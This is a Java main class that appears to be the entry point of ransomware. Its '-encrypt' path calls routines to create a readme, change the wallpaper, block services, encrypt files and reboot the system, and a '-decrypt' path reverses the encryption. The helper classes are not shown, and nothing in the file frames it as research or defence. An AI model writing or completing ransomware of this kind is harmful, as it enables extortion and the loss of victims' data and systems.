package kr.pah;

public class Main {
    public static void main(String[] args) throws Exception {
        if (args.length != 1) {
            return;
        }

        String option = args[0];

        if (option.equals("-encrypt")) {
            CreateReadme.main();
            WallpaperChanger.main();
            ServiceBlock.blockAll();
            Encrypt.main();
            SystemReboot.main();
        } else if (option.equals("-decrypt")) {
            Decrypt.main();
        } else {
            System.out.println("Invalid option: " + option);
        }
    }
}